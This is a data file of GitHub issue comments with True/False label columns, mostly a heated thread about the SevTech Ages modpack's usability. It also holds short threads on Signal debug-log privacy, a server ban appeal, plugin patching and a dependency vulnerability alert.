out (because the control used is shift-place). Etc. (and why does the water strainer have an inventory GUI when nothing else at this tech level does?). ""Nonintuitive"" only begins to describe the pain of this system. I haven't even gotten to the strangeness of saying that there is an item you can craft at tech level tutorial that includes an item you can't understand, that can be made ""in hand"" in your 2 x 2 but not on the work stump. All of these ""in world"" non-GUI blocks essentially restrict you to only those items that you have room for in your hot bar. None of the rest of your inventory space is usable. My hot bar is almost always nearly full in normal play, and even so far in the pack I don't have much space in it. I want to bring up the issue of the chopping block again. I complained about the behavior of the chopping block. I was told, ""You tap attack on the chopping block..... stop wasting our time with these issues use discord...."". Nowhere in the documentation that I saw -- not the pages for the mods, not any instruction in the achievement tree, no tooltips for the chopping block, nothing -- is the ""tap attack"" mentioned. And this is so much in line with everything else in Minecraft, that you see this tap attack used ... to pick up mine carts. And I think only to pick up mine carts. It isn't the norm, I am used to other mods that distinguish between your activities based on where you are pointing at -- heck, vanilla will rely on where you are aiming when it comes to placing stairs or slabs -- and to have my ""bug report"" (and the behavior did seem very buggy and exceedingly nonobvious) dismissed and closed with that remark seems very much ""anti-new player"". And ""stop wasting our time""? Do you have any idea how much time I have been spending trying to find something worth playing in this pack? Do you have any idea how much time I'm spending reporting the problems and flaws I'm running into as a new player? Do you have any idea how much time anyone else that tries to pick up this pack is going to spend trying to deal with the interface strangeness? My observation so far is that while there appeared to be a very large amount of things to do in tech level tutorial, the reality is that the arrangement of the achievements is highly misleading, and tech level tutorial is really tiny; most of it is actually tech level 0. But even in zero, while there appears to be many things to do, all that really matters is the ""advanced to the next tech level"" path. Let me repeat that I am being trained, early in the game, that all that matters is advancing to the next tech level, and everything else at any given stage of the game is pointless. You have gone to a great deal of effort to make these tech levels, put content in them, and all I am learning is to skip them as quickly as possible. That's just bad. I like the idea of a detailed progression pack, complete with an actually complete progression chart. The last time I saw something like this was Jaded's packs. (My only exposure to non-vanilla skyblock was agrarian skies, and an entire section of her quest lines was a chapter on how to skyblock.). I have tried playing other quest packs that did not actually have enough information in the quest lines that you'd have any idea what you were actually trying to do or how to do it. I really do appreciate the large amount of effort (and having tried to make a quest pack once myself, I do mean that I recognize and appreciate the large amount of effort). I have been told by my friends -- both the one who encouraged the rest of us to play this, and the other one that has gone crazy with the musical ceremonies -- that the pack gets much more interesting once I get to the musical ceremonies. I've even discovered that there is a bit of balance issue -- a single person trying to generate enough music by themselves will have trouble on some of the more complicated ceremonies, but 4 people playing music together will find that all of them are trivial. I like the idea of being required to learn mods that I normally do not use -- because there actually is an in game training for these mods, which is usually the point missing from most mods. But if there is no reason to stay around at a given tech level, if the goal that I am learning is ""just advance to the next tech level, and get access to better, more advanced and more powerful mods"", then why? Would I recommend this pack to anybody else? Not based on what I've seen so far. Why am I trying to continue playing this pack? Only because I have 3 friends at tech level 2, and they are waiting for me to catch up so we can play together. And I'm going to ask them to put a standard chest, and a standard crafting table in my room so that I can at least reduce the amount of pain that I have while playing (and I'm going to take advantage of the fact that they already have a horse powered chopping block set up so that I never have to worry about that tap attack issue again). Or, you know, just rely on the fact that I have a water strainer to give me all the planks I need. How does that make any sense anyways? ",True,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401280539,"In my opinion, PrimalCore and Immersive Craft are mostly meant (and to some extent Embers, Immersive Tech, Blood Magic -- basically anything without a GUI) to be used with VR goggles. What otherwise is tedious to use becomes the more agreeable way with VR. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/399713194,"I mean concerning the issue of SevTech not explaining things but rather assuming the player knows or can easily figure them out, that is a bit of a problem. I had plenty of instances where how to do something simple wasn't detailed anywhere in SevTech, and I find myself constantly googling things from specific mods in order to use them. Most recent example would be making stabilized metal with an arc furnace. JEI only says I needed a hardened mesh, iron, and some refined hardeners. All JEI showed was that I needed all three in the same place, but it turns out the refined hardeners needed to be in the modifiers slots along with the iron ingots. Never would I have guessed that iron ingots were NOT what was being melted down to make stabilized metal, and instead were put in the modifiers slots instead of the smelting spots. I spent over an hour and a half pulling my hair out. Google was of little help this time because the recipe is different in SevTech than what it showed elsewhere and I had to eventually just rummage through random youtube videos concerning steve's carts until I noticed one from a streamer involved an arc furnace, and surprise surprise he spent almost half an hour on the stream trying to figure out how to make stabilized metal. Only when he eventually discovered iron ingots needed to be on the right slots instead of the left in the arc furnace was I then also able to continue with it myself. There's like, probably a dozen examples of SevTech progression-related advancements where it just says ""do this thing with this mod"" but it doesn't tell you how, or always give you that mod book. There's a few books from mods that you have to craft in order to try and learn about that mod. It doesn't help that SevTech starts off by giving you these books when you reach those points for free, and then stops entirely leading the player to believe there IS no book to help with that mod when in fact there is, you just need to browse JEI until you find it and craft it.  There's a lot to complain about in terms of SevTech teaching players what to do. Not just in the first two ages either. I'm in age 4 and pausing the game to go spend half an hour googling information that isn't obvious or clear to me in order to progress or acquire something exceedingly valuable is simply par for the course at this point. I've gotten used to it and I never thought about how stupid it was. It do in fact hate games that make me stop playing them in order to figure out how to continue playing them. A modpack for a game like Minecraft was probably always going to entail this, though. As for the I actually disagree. All those extra advancements are more a quality-of-life thing. They are pointless in the same vein that the mushroom islands or woodland mansions are pointless in vanilla minecraft. If you consider defeating the Ender Dragon and watching the end credits to be the ultimate goal, then there's an ENORMOUS amount of stuff in vanilla miencraft that's pointless, and only there if you want it or find it fun to invest your time into. SevTech does this but on steroids. I've skipped kitten kaboodles of advancements because they didn't interest me. Literally never even touched Steve's Carts. Didn't even make a cart or use any of the mod at all. Only acquired stabilized metal to get a mob duplicator for my mob farm.  I think that's fine. It allows you to select what you want to do, and only rarely forces you into mundane or tedious vague bullshit as a requirement to progress OCCASIONALLY.  For the most part, the age-progression content is straightforward enough. There's nothing wrong with focusing on ONLY the age progressions. I for one played that way intentionally for a good while, thinking once I had enough stuff unlocked, I'd simply come back and browse what I wanted, getting it later, which is in fact now what I'm doing; building a massive sky castle that will have absolutely everything I could possibly want or need now that the majority of SevTech and its mod contents are available to me.  If you were hoping for progression where you only advance after doing 100% of everything in that age, I would argue you don't know what you're asking for, because during age 0 and 1, I thought that's what I had to do (again because SevTech never told me that age progression advancements had a unique shape to their advancement icons) and it was a tedious nightmare doing this and finding that and completing something I cared nothing for just to try and continue. Overall SevTech isn't really good for player's who aren't already at least relatively familiar with a large handful of mods. It requires homework outside of the game in order to keep going further, yes. I don't like it much either in that manner. It's more a serious of mods strung together with the idea of one unlocking the next, rather than something that was delicately crafted to provide the player the complete and total experience from several of the best mods available in the pack in as smooth and convenient a way as possible. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401551306,"I was all for trying this modpack out, and I look at all of the stuff and I'm like ""wow, this looks actually cool."", and then I get to the crafting stump.  Words cannot describe my hatred for the crafting stump. I have tried several things to get my items to go into the right spaces and even tried moving around it. I understand that there is a front side, I've moved to it. I've watched videos about it for christ's sake and I still couldn't get it to work. I tried doing my homework although everything didn't even work. The achievements didn't even play properly. I made my crafting stump and I was like ""oh, chopping block for planks."" so I made that and suddenly I just then got the achievement for it and the crafting stump (which only THEN let me advance to age 0). Same thing happened for when I broke a log with my hand, and then later made a fire stick, and THEN made a axe, I got the achievement for making fire (which I hadn't done), and breaking the log with my hand, and then the axe achievement. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401589794,"Well I mean... and only later do we discover that there's apparently a tool in age 0 that takes the leaves off of a large area of trees in almost no time.` Eeeeeyup. Definitely everything SevTech is about. It's a Minecraft-themed Homework Simulator.  When I was getting through age 3, I was making a bee-line for the age advancements to breach age 4, hoping blindly it would unlock diamonds by age 4 because why in the world would diamonds be exclusive to an age that prioritizes space travel? How are diamonds more valuable than literal rocket-science?  I wanted them because in the Cyclic book, I read about diamond spikes, which were the first item I discovered that apparently would act as a player-kill. Already having a small, rather inefficient mob farm built by that point, all I wanted were those diamond spikes so I could turn my mob farm into an experience farm as well. Come age 4 after some grueling and nightmare-ish progression grinding and googling and video watching and building and rebuilding when I realize I built it wrong and all the hullabaloo that comes with stupidly vague SevTech progression... I discover diamonds are in fact age 5 not 4, but browsing through JEI, I noticed mob grinding utils is now unlocked... which comes with mob-killing items that drop experience, and dark utilities now has a ""player trap"" which does the same thing as diamond spikes.  My ultimate goal was wisped away from me due to lack of SevTech information, and then immediately returned to me through another avenue via lack of SevTech information.  This is unfortunately how the whole experience is, honestly. You will have a suckish time if you don't constantly browse and research what is newly available. SevTech seriously seriously VERY EXTREMELY BADLY NEEDS a feature where it lists to you all the items unlocked by age, and also provide links to resources players will end up likely googling anyway just to try and learn more about a mod they are using. Since SevTech has so many mods, it needs to compensate for this massive overflowing incline of a learning curve it now results in, and provide players something more comprehensive.  Something to list what each age unlocks (only available after you reach that specific age). Way more detail about where to find more information concerning a mod (I.E. does the mod have a book the player can craft? Or should they default to googling and thus be provided a link from an in-game description instead?). SevTech is very anti-player-friendly.  Though to be honest, apathetic-looking github management and poor/nonexistent in-game teaching methods aside... I just want the damn modpack to work again. Seriously, whatever happened with the 3.0.8 update has made it so incredibly unfun to play SevTech with how unstable it is now that I may not ever have the motivation to actually make it to age 5.  Literally a complete rollback to 3.0.7 would be 100% acceptable to me at this point, because at least the modpack can be played in a heavy setting again, such as large builds or complicated surroundings (which, you know... age 4 and 5 will basically demand from the player anyway). Unfortunately, we may just be barking at a bush from the perspective of the people involved in sevtech development. If it was made primarily to meet a specific guy's standards, I doubt anybody but him coming forward and saying ""shit needs a lot of work, yo"" is gonna do anything besides fall on deaf ears. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401609493,"The 'poor me' that these posts are dripping with is infuriating, since it would unprofessional for the Dev Team to excoriate you, I'll step up. Most of this complaining is stupid.  You're complaining about lack of documentation, that is the Forge/Modded world in general.  Very few mods have 'user level' documentation, most tutorials that I have seen, have been from people taking the time to either have in-depth QA with the author, reading the API, or just experimenting. If you want your hand held through a puzzle pack, find a new hobby, this isn't for you.   Seriously, at worst SevTech is breaking your ego because you have forgotten what it's like to not know something about MineCraft.  I just started Modded this past Winter, as such, with every new pack there are different mods for me to learn.  SevTech merely took every thing you thought you knew and turned it on it's head, and you are butt hurt because you feel like a noob, and you're acting like a child, grow up. This was a commissioned work.  I am glad that the Dev Team and Sevadus have made this work public, it's challenging with many paths to achieve overall completion.  I am having fun with it.  It is frustrating with some of the changes to mechanics that are not apparent, but the Discord community is extremely helpful and courteous. Most of the issues you have brought up, are your issues.  There has not been anything in this pack that I have not found information on by watching Streamers, YouTubers (both mod tutorials and SevTech LP), or by reading/asking on Discord. It might simply be this mod pack is not for you, but that is all on you not the Dev Team.  There are 1200+ other mods and 2000+ video games released every year, and if that's still not for you, Crayola might have something more your speed. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401582377,"I deliberately waited a week before replying, because I wanted to make sure that I had a chance to look at this from a point of calmness. Every place that takes bug reports says, break your bug report up. One bug report per issue. Lots of tiny reports. A big report is hard to work with, because no-one wants to start it, because it will take forever to complete. Lots of tiny reports. Were my reports actual ""help, I need support, how do I solve this""? No. They were ""this is broken."". Mipmaps causing problems. Identified in a Forge pull request as mods doing the equivalent of a graphic state push, alteration, and no balancing graphics state pop. A Forge pull request to catch it and fix it by Forge so that you don't need to worry about fixing every single mod that's messing up. Definitely a mod bug, but no clear idea which mod was messing up. Now fixable with a Forge upgrade. (Entirely separate we are warned not to try to upgrade Forge ourself in this pack, because that will break something else). Flint not flaking every single time. Turns out this is apparently expected. Not every attempt to make a flake gets a roll, and you won't always succeed at your attempt. So you have to attempt multiple times, and you're going to have losses. This is not documented, but is expected behavior. A complaint about how items that you pick up off the ground go into your hot bar, and then get dropped as you move your mouse wheel. ""Works as intended"". I'm getting advancements that I haven't earned. ""Eh, we can't fix it"". The hiding of things that you can't detect failing in the case of ore samples. ""Known, but we can't fix it"". Oh, not closed as duplicate, not closed as can't fix, not closed as won't fix, but as ""invalid"". An issue where a new player does not even see the work stump, because of how the advancements are laid out. Along with the comment of ""Okay, now I see it"". Closed without comment. A follow-up report where I say, ""the flint pickaxe trio shows up well before the work stump, even though it cannot be made until after the work stump. This is confusing."". A response of basically, ""we can't do anything about this, this is how the person responsible wants it"". Another report about the Spear and Tomahawk being oddly placed in the achievements, and asking for flaked flint points to be made a tutorial-level item. Closed without comment. Reporting an inconsistency in the way that the spear and tomahawk display information compared to everything else. ""As intended"". 2 different reports about problems making use of just enough items features with work stumps. ""You just don't. You have to deserve it."" A report about getting information on Galactic craft at age 0, instead of something more appropriate (I'm guessing age 4). Closed without comment. A complaint about having to pulse attack to make planks. ""You tap attack on the chopping block..... stop wasting our time with these issues use discord...."". And in this thread, you made it clear that you thought I was asking for support. Not reporting problems. Please take a look at what I have written here tonight. Do you see how a new player, who has never seen this pack before, and is trying to play it through, is going to get very discouraged very quickly? ""That and most of them are Discord issues. This tracker is for bug reports and mod suggestions"" -- WHICH EVERY SINGLE ONE OF THESE IS. Discord is a horrible support tool. Compared to forums, Discord is a horrible support tool. There is effectively no history. There is no way to have any type of ongoing discussion about a topic. There is no way for people to comment on the same topic a day later, and be read and understood by somebody a week later. There is next to no ""pinned topic"" feature like there is in forums. You can pin single messages, but there's no way to respond to them. There is zero expectation that messages posted in Discord will be seen by anybody with the ability to deal with it. High-volume, high noise level, low signal-to-noise value, no organization, and nothing keeping track of what an administrator has/has not yet read, at least nowhere near the degree to which a forum does. ""We're not going to waste our own time when working on the pack and then deal with issues which no effort was put into them or could have been dealt with in Disord."" No effort? No Effort? NO EFFORT? Every single issue that I reported, excluding only the flint flaking, I mentioned how to work around the problem that I found. With flint flaking, there was no workaround because the only problem was the documentation. You complain that I don't put any time into this? I do. You complain that I don't make any effort to solve the problems on my own? I do. More than anything else, it is this dismissal that infuriates me. But none of this is the real problem. Let me restate that. TL; DR none of this is the real problem. ""But to be clear this pack was designed for Sevadus. It's designed around him and how he wanted it. Nothing will change in regards to the advancements or layout. It's done to a spec which we met."" This is the real issue. Do you not see it? Then let me spell it out. Sevadus is the one who has to approve changes. That means any issues with the modpack ultimately need to go to him. Not to you. Trying to report any issue to you is pointless; the only one that matters is somebody who isn't even here, doesn't read these reports, doesn't get reports sent upstream to him from you for his comments, and is completely out of the loop. So why is this issues thing even here? Why do you have an issues section on this GitHub, when ultimately you can't actually do anything? When you just want us to use discord? "" It doesn't help that SevTech starts off by giving you these books when you reach those points for free, and then stops entirely leading the player to believe there IS no book ..."". Well, no apparently, the first person on a server to reach an age where there is a book will get the books for free. Other players don't, and if they aren't aware that the mod has a book, they are clueless. Even worse, imagine seeing a whole bunch of new things show up in your achievements, and not seeing anything at all about backpacks. Absolutely no clue that backpacks have opened up for you. In a modpack that basically triples the number of items that there are to collect. That you need. When your chest/storage space ability has been crippled. ""I'm in age 4 and pausing the game to go spend half an hour googling information that isn't obvious or clear to me in order to progress or acquire something exceedingly valuable is simply par for the course at this point. I've gotten used to it and I never thought about how stupid it was. "". Isn't this basically the point of a quest line? Sorry, an achievement line? I was ready to give up on this completely. My friends basically apologized for rushing through, and rushing ahead so quickly. One of them got to age 3 in a solo world, (during her time off from medical school), and introduced this pack to the rest of us. Another got to age 2 in a solo world in something like 10 days. (As he says, he has no life). The 2 of them worked together with the 3rd person, and they all got at least half way through age 0 during the first week of part-time play while I was still trying to connect my own machine. I tried to progress on my own, trying to catch up with them. By the next weekend? The one with no life had split off from the rest of the group, made his own base, and advanced to age 1. I was struggling with basics. By the end of that weekend, no life was up to age 2, everyone else was up to age 1, we had a teleport network built between our bases, I was trying to make string (and at this point I don't even remember what it was that I needed the string for), and was trying to put down enough torches to safely light up our area, only to realize that instead of one block of wood making 8 sticks making 32 torches, one block of wood might make 6 sticks which makes 2 torches. And a mass of giant trees took more than 3 work blades to de-leaf (because you get more sticks from work blade de-leafing than you do from decay), absolute full of pain and anguish, taking a massive amount of time, and only later do we discover that there's apparently a tool in age 0 that takes the leaves off of a large area of trees in almost no time. If it was just me, I'd already be gone. My friends have convinced me that the pack isn't quite so bad if you have someone to lead you through it, and the other comments in this thread tell me that other people need to be led through it. So the quest line/achievement lines are not sufficient, and the person who made this pack is happy with that. That stinks. I'll probably make videos of my play through and learning, with the goal of being a ""how-to"" for the people who come after me, because this pack badly needs it. ",True,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401653140,"Okay, that's quite enough of this. This has gone well out of proportion and you guys are now at each other's throats. ",False,True,False,SevTech-Ages/DarkPacks/2977
SpongeForge/SpongePowered/2339/343759708,hello i need personal support for my exttreme reackers not work ,False,True,False,SpongeForge/SpongePowered/2339
SevTech-Ages/DarkPacks/2977/401637470,"Hello, I have refrained from commenting here as I think the issue has become a little inflamed with a fair bit of rhetoric and complaining. I am the author of the mod that at first orders has annoyed you so much. ""All of these ""in world"" non-GUI blocks essentially restrict you to only those items that you have room for in your hot bar. None of the rest of your inventory space is usable. My hot bar is almost always nearly full in normal play, and even so far in the pack I don't have much space in it."" This is part of the reason we made these blocks. Why should you be entitled to vanilla inventory management in a hugely modded pack? I was asked to make blocks that worked without guis and were more 'primitive' than the vanilla blocks you unlock later. This was the objective to making players appreciate even the most simple of vanilla blocks once more. ""Good or bad, you have basically chosen to document the modpack and its recipes with JEI. And that documentation is lost as soon as you are using the work stump. The mod page for primal tech (work stump mod) claims that it has JEI support. Yet I don't see it in play."" OK this is a technical problem that involves several mods, of which none of us has a viable solution to fixing. The mod for the most part has JEI support for recipes, but the workstumps are a special case that cannot be added due to restraints on game stages, JEI and Primal tech (as well as other mods) with auto-crafters. The complaints about the placing mechanics are just that, complaints - sorry but I like it and it does what it needs to; limits the player from just throwing a load of things in to a gui with shift clicks and magically pulling out an item. I'm sure many of the things you deem 'unplayable' in the pack are more annoyances than game-breaking, so I'll leave it there at the risk of a wall of text (whoops too late). Cheers, Me. ",False,True,False,SevTech-Ages/DarkPacks/2977
SevTech-Ages/DarkPacks/2977/401630430,"JEI has literally EVERY RECIPE in the pack.... so whats the problem?   It's even setup in a manner where, if it's not in JEI, you can't make it.... yet. No one said Discord was required. I offended you? Working as intended.  Your OP is offensive given that you paid exactly nothing for SevTech but have the gall to stand up on a soap box and complain about, how a group of hobbyists did not make this pack for the general population.  As you have repeated pointed out, the pack was made for Sevadus.  Since you haven't paid money for the pack,  they are under no obligation to do anything.  Yet your attitude is that of someone that paid money for a product and is expecting a much higher tier of support.   This make you and entitled jerk. I have perused all of your tickets... honestly most of them are just a difference of opinion, and you, in this post come off as your opinion should have more weight than it really does.   The remainder are issues with the behavior of a specific mod which would need to be taken up with the mod author, not the pack author.   Based on some of the responses... you need to learn how to use the search/filter button. This issue tracker is for things not working as the AUTHOR intended, not how you think it should be, nor how you would have done it. You also mention that you're playing as part of a group... why are you not using the group mechanics? This pack has a theme, a structure that was intended from the outset.  Your opinion on implementation does not matter in the slightest.  You were not the intended audience. ",False,True,False,SevTech-Ages/DarkPacks/2977
Signal-iOS/WhisperSystems/2540/338758265,"yeah truly i agree with this bug , why the fuck i would c the last digits of my phone number in the debug report ???????? what kind of privacy shit we are talking about ? ",True,True,False,Signal-iOS/WhisperSystems/2540
Signal-iOS/WhisperSystems/2540/343155742,"not just the phone number, if you pay attention there are lots of other unique ids there for signal devs to make a link between your github account and the signal account, including the timestamps (as they have sub milisecond resolution). ",False,True,False,Signal-iOS/WhisperSystems/2540
Signal-iOS/WhisperSystems/2540/258095414," [x] I have searched open and closed issues for duplicates   Bug description Signal's debug log currently contains part of the phone number of both the sender and recipient in the following form and posts it publicly to a gist Sender [ REDACTED_PHONE_NUMBERxxx999 ] Receiver [ REDACTED_PHONE_NUMBERxxx123 ] IMO all personally identifiable information should be removed from these. More users such as myself will be willing to submit debug logs. Steps to reproduce  Settings &gt; Advanced &gt; Enable debug log Perform an action on the phone Click submit debug log and choose link. View the gist to see the contents.  Actual result Partially redacted phone numbers exist. Expected result No personally identifiable info should exist in the debug log Possible solutions  Redact/remove the phone number entirely (preferred) If this info is sometimes needed by devs, hash the exposed digits for privacy. And then it could be compared against the hashed last digits of numbers in the DB if needed. Although this is probably rarely needed. Use a random UUID for users both locally and in the DB if needing to identify the users so part of phone number isn't exposed.  Device info Device iPhone 6 iOS version 10.3.3 Signal version 2.15.3.2 ",False,True,False,Signal-iOS/WhisperSystems/2540
SevTech-Ages/DarkPacks/2977/401614405,"Sorry, no. Number one this is a pack with custom recipes, and custom unlocks. It's not just ""look up the docs for a mod"". It's ""trying to figure out what was changed specifically for this pack"". Number 2 Again requiring Discord to have any clue about what you're doing is the wrong idea. Number 3 Please re-read what you just wrote. Assume that that was written to you, instead of by you. Would you consider that to be insulting? I did. Number 4 You are not Sevadus. We have already established that this pack is one person's view, as implemented by a team. Not you. You do not have the authority to make the declarations you just made. They are your opinions only, yet you want to treat them as absolute truths. Please re-read what I said after my TL DR. You have just described the mods that I don't use or play with. If I am looking at potentially hundreds of mods, I am not going to spend 30 minutes to 2 hours on each one evaluating it. Mods that I play with are mods where the forum post explains enough of what the mod does/how it does it, and if it has a wiki, it's not just an empty skeleton for the users to populate, but an actual info dump from the author of the mod. Conversion modpacks? I've played a couple. My minimum standard is around the level of agrarian skies. That wasn't perfect, but it was good enough. Resource limited maps like skyblock in vanilla Minecraft make you think, but you're working with what you know. Maps where you start with essentially one sapling, some useless ground, and a bunch of mods you might have never played with, and then say ""go study these mods for another 3 hours; we won't tell you which mods to look at, we won't tell you what your goal is, and your only clue is to come from someone else who has already gone through this and figured it out"" are nothing more than distributed time wasting. This pack is right in the middle. It is distributed time wasting, but hey, at least we were clearly pointed at totemic upon entering age 0. Except for the things that we weren't pointed at, like absolutely no hint that there are backpacks in this pack. This is not ""poor me"". This is ""I think this is bad design, and here is why."" The response is basically ""only one person has the authority to say I agree, or I disagree, and that person isn't here"". ",False,True,False,SevTech-Ages/DarkPacks/2977
SpongeForge/SpongePowered/2339/407172824,This is why It's important to discuss issues before reporting them here. It stops this. ,False,True,False,SpongeForge/SpongePowered/2339
SpongeForge/SpongePowered/2339/407174103,"or you could just be like a normal person and follow the issue template; include your sponge+forge version, full mod + plugin list, a minimal reproduction case, and all relevant logs ",False,True,False,SpongeForge/SpongePowered/2339
SpongeForge/SpongePowered/2339/407175915,Sponge testing discord needs to be completely streamlined for testing and not setup as personal support for latest builds. ,False,True,False,SpongeForge/SpongePowered/2339
SwipeCellKit/SwipeCellKit/199/324621739,"Hi, apologies as this appears to be similar to a few other questions but I am still struggling with this. I have the following gesture added to the tableview in viewDidLoad() ... the SwipeTableViewCellDelegate protocols adopted as follows ... The delete button shows up fine when swiping from right-to-left and delete action is executed properly. However, the tableView gesture is disabled somehow and does not execute. It does execute outside of the cells (e.g. when I have no cells or after the last cell) so I know it works. What am I doing wrong here? ",False,True,False,SwipeCellKit/SwipeCellKit/199
SwipeCellKit/SwipeCellKit/199/390413370,thank you! that worked ,False,True,False,SwipeCellKit/SwipeCellKit/199
SwipeCellKit/SwipeCellKit/199/390411790,"Just because you only have one swipe action on the right, doesn’t mean users won’t swipe left in relation to that action. They may want to swipe left to close it, they may swipe right and left in one motion, etc. That being said, what is happening is that the cells swipe gesture is taking priority over your own. So you can try the answers here ",False,True,False,SwipeCellKit/SwipeCellKit/199
SpongeForge/SpongePowered/2339/407169977,Please be more specific. ,False,True,False,SpongeForge/SpongePowered/2339
Telegram/DrKLO/1173/89517134," please, help me ) ",False,True,False,Telegram/DrKLO/1173
TAW-Magazyn/SideswipeN7/16/218910283,story points 2 I want to Create Method RegisterItem As a Developer So We can add new Items AC Method should take one argument - object of class Artukul and adds it to the databes. Method should return Http.Created if added well or if not added other meessage allerting error like Http.Conflict ,False,True,False,TAW-Magazyn/SideswipeN7/16
Terra/ObliqueNET/139/400348618,"Okay, I got banned for something I didn't do and the staff didn't take proof pics either. I'd accept the ban if I actually did something to get banned for, other than that, I say no, it's not right to ban someone for something they never did, but okay. ",True,True,False,Terra/ObliqueNET/139
Terra/ObliqueNET/139/455230992,"Couple things missing from your ban appeal - your username, the ban reason when you try to connect, and how long ago your ban started. I literally cant tell with what you have provided so far. ",False,True,False,Terra/ObliqueNET/139
Terra/ObliqueNET/139/455850225,"Ras, hun, you know pretty well who I am ",False,True,False,Terra/ObliqueNET/139
Terra/ObliqueNET/139/456904268,"Ras, why did I get banned for saying phone numbers in chat when I didn't? Idek any ones irl name, how tf am I supposed to know their number when Idk their irl name and last name? Like bruh, what's wrong with you? ",True,True,False,Terra/ObliqueNET/139
Terra/ObliqueNET/139/456909459,"You were banned for spamming the chat with a banned player's phone number. That you have momentary Alzheimer doesn't erase that. Good of you to try, but we aren't stupid. ",False,True,False,Terra/ObliqueNET/139
TinkersConstruct/SlimeKnights/2590/191193068,"You cannot hear blocks breaking when using any tinkers construct tool, while you have the friendly creature sound setting set to zero percent in the options menu. ",False,True,False,TinkersConstruct/SlimeKnights/2590
TotalFreedomMod/TotalFreedom/2004/224342781,"Make it overrides real console execute, soo it doesn't run or bypass all command blocks. ",False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/297470918,"the server jar needs some modding to remove the real execute, i can do it. ",False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/297546191,@friend So has this already been patched on the server build? ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/298312166,"Yep, it has been patched, with a small edit on totalfreedom server jar and this addiction in tfm ",False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/302300863,The simple patch fix is to change this line ( to ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/309420197,@friend Command_gcmd is not the problem ) ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/309435509,I realised. ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/392328680,Now we no longer have Clanforge is this still an issue? ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/392533441,@friend What was the reason for the issue closing? ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/392536692,"Cause im not  helping tf  From Ryan notifications@friend.com Sent Monday, May 28, 2018 35411 PM To TotalFreedom/TotalFreedomMod Cc marcocorriero; Mention Subject Re [TotalFreedom/TotalFreedomMod] Make execute a TFM command. (#2004) @friend What was the reason for the issue closing? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/392540684,So given there has been no valuable contribution I'm re-opening until we can validate the issue is in fact solved or no longer relevant. ,False,True,False,TotalFreedomMod/TotalFreedom/2004
TotalFreedomMod/TotalFreedom/2004/392549146,So you're going to act like a child. Rasing a new ticket on #2164 ,True,True,False,TotalFreedomMod/TotalFreedom/2004
UKRegionTest/koorellasuresh/320092/436936377,First from flow in UK South ,False,True,False,UKRegionTest/koorellasuresh/320092
VanillaDeathChest/TheRandomLabs/11/436909244,"VanillaDeathChest seems to crash with a few mods when they are put together, those being Pehkui and StatsKeeper (Fabric). I have a crash log. ",False,True,False,VanillaDeathChest/TheRandomLabs/11
VanillaDeathChest/TheRandomLabs/11/486476314,Thanks for reporting this. It's because we're both trying to modify  in . I'll see what I can do. ,False,True,False,VanillaDeathChest/TheRandomLabs/11
adaptive-images/CoolBreeze613/8/433378625,"CVE-2015-8857 - High Severity Vulnerability &lt;details&gt;&lt;summary&gt;&lt;img src=' width=19 height=20&gt; Vulnerable Library - &lt;b&gt;uglify-js-2.2.5.tgz&lt;/b&gt;&lt;/p&gt;&lt;/summary&gt; &lt;p&gt;JavaScript parser, mangler/compressor and beautifier toolkit&lt;/p&gt; &lt;p&gt;Library home page &lt;a href="" to dependency file /adaptive-images/package.json&lt;/p&gt; &lt;p&gt;Path to vulnerable library /tmp/git/adaptive-images/node_modules/transformers/node_modules/uglify-js/package.json&lt;/p&gt; &lt;p&gt;  Dependency Hierarchy   - grunt-html2js-0.2.9.tgz (Root Library)     - jade-1.11.0.tgz       - transformers-2.1.0.tgz         - x **uglify-js-2.2.5.tgz** (Vulnerable Library) &lt;/p&gt; &lt;/details&gt; &lt;p&gt;&lt;/p&gt; &lt;details&gt;&lt;summary&gt;&lt;img src=' width=19 height=20&gt; Vulnerability Details&lt;/summary&gt; &lt;p&gt;    The uglify-js package before 2.4.24 for Node.js does not properly account for non-boolean values when rewriting boolean expressions, which might allow attackers to bypass security mechanisms or possibly have unspecified other impact by leveraging improperly rewritten Javascript.  &lt;p&gt;Publish Date 2017-01-23 &lt;p&gt;URL &lt;a href= src=' width=19 height=20&gt; CVSS 3 Score Details (&lt;b&gt;9.8&lt;/b&gt;)&lt;/summary&gt; &lt;p&gt;  Base Score Metrics - Exploitability Metrics   - Attack Vector Network   - Attack Complexity Low   - Privileges Required None   - User Interaction None   - Scope Unchanged - Impact Metrics   - Confidentiality Impact High   - Integrity Impact High   - Availability Impact High &lt;/p&gt; For more information on CVSS3 Scores, click &lt;a href="" src=' width=19 height=20&gt; Suggested Fix&lt;/summary&gt; &lt;p&gt;  &lt;p&gt;Type Upgrade version&lt;/p&gt; &lt;p&gt;Origin &lt;a href="" Date 2018-12-15&lt;/p&gt; &lt;p&gt;Fix Resolution v2.4.24&lt;/p&gt;&lt;/p&gt; &lt;/details&gt; &lt;p&gt;&lt;/p&gt; Step up your Open Source Security Game with WhiteSource here  ",False,True,False,adaptive-images/CoolBreeze613/8
